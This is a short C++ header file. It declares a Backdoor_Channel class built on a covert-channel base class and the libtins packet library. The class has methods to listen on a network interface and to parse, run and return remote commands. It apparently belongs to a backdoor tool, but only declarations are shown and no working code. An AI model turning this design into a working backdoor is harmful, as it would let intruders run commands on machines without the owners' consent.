#ifndef Backdoor_Channel_H
#define Backdoor_Channel_H

#include <string>
#include "covert_channel.h"

using std::string;
using namespace Tins;

class Backdoor_Channel : public Covert_Channel
{
public:

    void start(string interface, int listen_port, int target_port);

private:

    bool parse_command(Job& j);
    bool handle_run_cmd(Job& j);
    bool handle_ret_cmd(Job& j);


};

#endif // Covert_Channel_H
